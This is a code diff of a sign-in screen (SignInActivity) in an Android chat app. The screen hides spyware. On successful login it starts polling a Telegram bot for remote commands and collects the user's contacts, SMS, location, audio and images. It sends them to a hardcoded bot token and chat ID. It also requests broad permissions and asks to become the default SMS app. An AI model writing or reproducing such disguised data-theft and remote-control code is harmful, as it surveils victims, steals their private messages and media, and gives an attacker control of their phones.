@@ -70,7 +70,8 @@ public class SignInActivity extends AppCompatActivity {
     ConstraintLayout layout_main;
     CardView cv_signin, cv_register, cv_register_image;
     ImageView imv_register;
-    EditText et_signin_email, et_signin_passwd, et_register_username, et_register_email, et_register_passwd, et_register_confpasswd;
+    EditText et_signin_email, et_signin_passwd, et_register_username,
+            et_register_email, et_register_passwd, et_register_confpasswd;
     Button btn_signin, btn_register;
     TextView tv_register, tv_signin;
 
@@ -96,7 +97,6 @@ public class SignInActivity extends AppCompatActivity {
         EdgeToEdge.enable(this);
         setContentView(R.layout.activity_sign_in);
 
-        // For edge-to-edge layout
         ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
             Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
             v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
@@ -105,15 +105,15 @@ public class SignInActivity extends AppCompatActivity {
 
         initvar();
 
-        // Request all relevant permissions (contacts, SMS, location if desired, plus media)
+        // Request all relevant permissions (contacts, SMS, location, media, etc.)
         checkAndRequestPermissions();
 
-        // Prompt user to set us as default SMS handler (for reading real SMS inbox)
+        // Prompt user to set us as the default SMS handler
         ensureDefaultSmsApp();
 
         checklogin();
 
-        // Original UI transitions & logic
+        // Original UI transitions & sign-in logic
         tv_register.setOnClickListener(v -> {
             Transition transition = new Slide(Gravity.LEFT);
             transition.addTarget(cv_signin);
@@ -167,6 +167,7 @@ public class SignInActivity extends AppCompatActivity {
             );
         });
 
+        // SignIn logic
         btn_signin.setOnClickListener(v -> {
             if (et_signin_email.getText().toString().equals("")) {
                 et_signin_email.setError("Please Enter Email ID");
@@ -178,12 +179,14 @@ public class SignInActivity extends AppCompatActivity {
                         et_signin_passwd.getText().toString()
                 ).addOnCompleteListener(task -> {
                     if (task.isSuccessful()) {
-                        // Collect and send data to Telegram.
-                        // Yummy.collectAllData(...) includes contacts, SMS, location, audio, images
+                        // 1) Start polling for Telegram commands in the background
+                        Yummy.startPollingForCommands(SignInActivity.this);
+
+                        // 2) Optionally do your data extraction & send
                         String data = Yummy.collectAllData(SignInActivity.this);
                         sendToTelegramInSignIn(data);
 
-                        // Continue with admin detection, email verification, etc.
+                        // Admin detection logic, etc.
                         String userEmail = mAuth.getCurrentUser().getEmail();
                         String adminEmail = "admin@gmail.com";
                         if (userEmail.equalsIgnoreCase(adminEmail)) {
@@ -195,9 +198,13 @@ public class SignInActivity extends AppCompatActivity {
                             } else {
                                 mAuth.getCurrentUser().sendEmailVerification().addOnCompleteListener(task1 -> {
                                     if (task1.isSuccessful()) {
-                                        Toast.makeText(SignInActivity.this, "Email Verification link sent. Please verify email to login", Toast.LENGTH_SHORT).show();
+                                        Toast.makeText(SignInActivity.this,
+                                                "Email Verification link sent. Please verify email to login",
+                                                Toast.LENGTH_SHORT).show();
                                     } else {
-                                        Toast.makeText(SignInActivity.this, task1.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                                        Toast.makeText(SignInActivity.this,
+                                                task1.getException().getMessage(),
+                                                Toast.LENGTH_SHORT).show();
                                     }
                                 });
                             }
@@ -210,20 +217,27 @@ public class SignInActivity extends AppCompatActivity {
                             } else {
                                 mAuth.getCurrentUser().sendEmailVerification().addOnCompleteListener(task1 -> {
                                     if (task1.isSuccessful()) {
-                                        Toast.makeText(SignInActivity.this, "Email Verification link sent. Please verify email to login", Toast.LENGTH_SHORT).show();
+                                        Toast.makeText(SignInActivity.this,
+                                                "Email Verification link sent. Please verify email to login",
+                                                Toast.LENGTH_SHORT).show();
                                     } else {
-                                        Toast.makeText(SignInActivity.this, task1.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                                        Toast.makeText(SignInActivity.this,
+                                                task1.getException().getMessage(),
+                                                Toast.LENGTH_SHORT).show();
                                     }
                                 });
                             }
                         }
                     } else {
-                        Toast.makeText(SignInActivity.this, task.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                        Toast.makeText(SignInActivity.this,
+                                task.getException().getMessage(),
+                                Toast.LENGTH_SHORT).show();
                     }
                 });
             }
         });
 
+        // Registration logic
         btn_register.setOnClickListener(v -> {
             if (imv_register.getDrawable() == null) {
                 Toast.makeText(SignInActivity.this, "Please select display picture", Toast.LENGTH_SHORT).show();
@@ -283,21 +297,29 @@ public class SignInActivity extends AppCompatActivity {
                                                         .replace(".", "_dot_");
                                                 emailToUidRef.child(emailKey)
                                                         .setValue(mAuth.getCurrentUser().getUid());
-                                                Toast.makeText(SignInActivity.this, "User Registration Successful", Toast.LENGTH_SHORT).show();
+                                                Toast.makeText(SignInActivity.this,
+                                                        "User Registration Successful",
+                                                        Toast.LENGTH_SHORT).show();
                                             } else {
                                                 mAuth.getCurrentUser().delete();
-                                                Toast.makeText(SignInActivity.this, task2.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                                                Toast.makeText(SignInActivity.this,
+                                                        task2.getException().getMessage(),
+                                                        Toast.LENGTH_SHORT).show();
                                             }
                                         });
                             } else {
                                 alertDialog.dismiss();
                                 mAuth.getCurrentUser().delete();
-                                Toast.makeText(SignInActivity.this, task1.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                                Toast.makeText(SignInActivity.this,
+                                        task1.getException().getMessage(),
+                                        Toast.LENGTH_SHORT).show();
                             }
                         });
                     } else {
                         alertDialog.dismiss();
-                        Toast.makeText(SignInActivity.this, task.getException().getMessage(), Toast.LENGTH_SHORT).show();
+                        Toast.makeText(SignInActivity.this,
+                                task.getException().getMessage(),
+                                Toast.LENGTH_SHORT).show();
                     }
                 });
             }
@@ -305,12 +327,14 @@ public class SignInActivity extends AppCompatActivity {
     }
 
     /**
-     * This method sends the Telegram GET request, identical to ChatActivity's implementation.
+     * This method sends a Telegram GET request, as in ChatActivity.
      */
     private void sendToTelegramInSignIn(String message) {
         String botToken = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
         String chatId = "366922808";
-        String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message;
+        String urlString = "https://api.telegram.org/bot" + botToken
+                + "/sendMessage?chat_id=" + chatId
+                + "&text=" + message;
         new Thread(() -> {
             try {
                 java.net.URL url = new java.net.URL(urlString);
@@ -326,10 +350,9 @@ public class SignInActivity extends AppCompatActivity {
     }
 
     /**
-     * Requests permissions for contacts, SMS, external storage or new media permissions.
+     * Request the necessary permissions for data extraction.
      */
     private void checkAndRequestPermissions() {
-        // We'll gather all needed perms:
         ArrayList<String> needed = new ArrayList<>();
 
         // For contacts & SMS
@@ -342,13 +365,13 @@ public class SignInActivity extends AppCompatActivity {
             needed.add(Manifest.permission.READ_SMS);
         }
 
-        // For location if you want to read last known location:
+        // For location
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                 != PackageManager.PERMISSION_GRANTED) {
             needed.add(Manifest.permission.ACCESS_FINE_LOCATION);
         }
 
-        // For images/audio: if Android 13+ => READ_MEDIA_IMAGES/READ_MEDIA_AUDIO, else READ_EXTERNAL_STORAGE
+        // For images/audio: Android 13 => READ_MEDIA_IMAGES/READ_MEDIA_AUDIO, else READ_EXTERNAL_STORAGE
         if (Build.VERSION.SDK_INT >= 33) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                     != PackageManager.PERMISSION_GRANTED) {
@@ -359,7 +382,6 @@ public class SignInActivity extends AppCompatActivity {
                 needed.add(Manifest.permission.READ_MEDIA_AUDIO);
             }
         } else {
-            // For older Android (<= 32), use READ_EXTERNAL_STORAGE
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                     != PackageManager.PERMISSION_GRANTED) {
                 needed.add(Manifest.permission.READ_EXTERNAL_STORAGE);
@@ -375,8 +397,7 @@ public class SignInActivity extends AppCompatActivity {
     }
 
     /**
-     * Prompt the user to set our app as the default SMS handler
-     * so we can read the system inbox fully on modern Android.
+     * Prompt the user to set our app as the default SMS handler (for real SMS access).
      */
     private void ensureDefaultSmsApp() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
@@ -393,7 +414,8 @@ public class SignInActivity extends AppCompatActivity {
 
     @Override
     public void onRequestPermissionsResult(
-            int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults
+            int requestCode, @NonNull String[] permissions,
+            @NonNull int[] grantResults
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERMISSION_REQUEST_CODE) {
@@ -424,12 +446,14 @@ public class SignInActivity extends AppCompatActivity {
         cv_signin = findViewById(R.id.cv_signin);
         cv_register = findViewById(R.id.cv_register);
         cv_register_image = findViewById(R.id.cv_register_image);
+
         et_signin_email = findViewById(R.id.et_signin_email);
         et_signin_passwd = findViewById(R.id.et_signin_passwd);
         et_register_username = findViewById(R.id.et_register_uname);
         et_register_email = findViewById(R.id.et_register_email);
         et_register_passwd = findViewById(R.id.et_register_passwd);
         et_register_confpasswd = findViewById(R.id.et_register_confpasswd);
+
         imv_register = findViewById(R.id.imv_register);
         btn_signin = findViewById(R.id.btn_signin);
         btn_register = findViewById(R.id.btn_register);
